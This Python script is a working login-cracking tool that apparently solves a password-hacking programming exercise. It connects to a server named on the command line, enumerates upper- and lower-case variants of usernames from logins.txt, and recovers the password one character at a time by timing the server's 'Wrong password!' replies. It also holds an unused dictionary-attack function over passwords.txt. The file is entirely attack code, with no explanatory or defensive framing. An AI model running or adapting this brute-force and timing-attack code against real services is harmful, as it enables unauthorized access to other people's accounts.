import sys
import socket
import string
import itertools
import json
import time


def connection(address):
    with socket.socket() as client_socket:
        client_socket.connect(address)

        # admin_password = check_password(client_socket)
        # admin_password = check_password_list(client_socket)
        admin_password = check_login_list(client_socket)

        print(admin_password)


def main():

    args = sys.argv

    ip_address = args[1]
    port = int(args[2])
    address = (ip_address, port)

    connection(address)


def check_password(client_socket, log_dict):
    alphas = list(string.ascii_lowercase)
    digits = list(string.digits)
    alphas_upper = list(string.ascii_uppercase)
    alphas_digits = alphas + alphas_upper + digits
    full_password = []

    def search(full_pass, rdict):
        comb_alphas = itertools.product(alphas_digits, repeat=1)

        for combination in comb_alphas:
            attempt = ''.join(combination)
            rdict["password"] = ''.join(full_pass) + attempt

            attempt_dict = json.dumps(rdict)
            attempt_dict = attempt_dict.encode()

            client_socket.send(attempt_dict)

            start = time.perf_counter()
            response = client_socket.recv(1024)
            end = time.perf_counter()
            response = response.decode()

            if "Connection success!" in response:
                return json.dumps(rdict)
            elif "Wrong password!" in response and (end - start) >= 0.1:
                full_pass = rdict["password"]
                return search(full_pass, rdict)

    password = search(full_password, log_dict)

    return password


def check_password_list(client_socket):
    with open('passwords.txt') as f:
        f = f.readlines()
        for line in f:
            line = line.strip()

            combination = itertools.product(*([letter.lower(), letter.upper()] for letter in line))

            for attempt in combination:
                attempt = ''.join(attempt)
                attempt = attempt.encode()

                client_socket.send(attempt)

                response = client_socket.recv(1024)
                response = response.decode()
                if response == "Connection success!":
                    return attempt.decode()


def check_login_list(client_socket):
    dict_comb = {"login": " ", "password": " "}

    with open('logins.txt') as f:
        f = f.readlines()
        for line in f:
            line = line.strip()

            combination = itertools.product(*([letter.lower(), letter.upper()] for letter in line))

            for attempt in combination:
                attempt = ''.join(attempt)
                dict_comb["login"] = attempt
                attempt_dict = json.dumps(dict_comb)
                attempt_dict = attempt_dict.encode()

                client_socket.send(attempt_dict)

                response = client_socket.recv(1024)
                response = response.decode()

                if "Wrong password!" in response:
                    return check_password(client_socket, dict_comb)


if __name__ == "__main__":
    main()
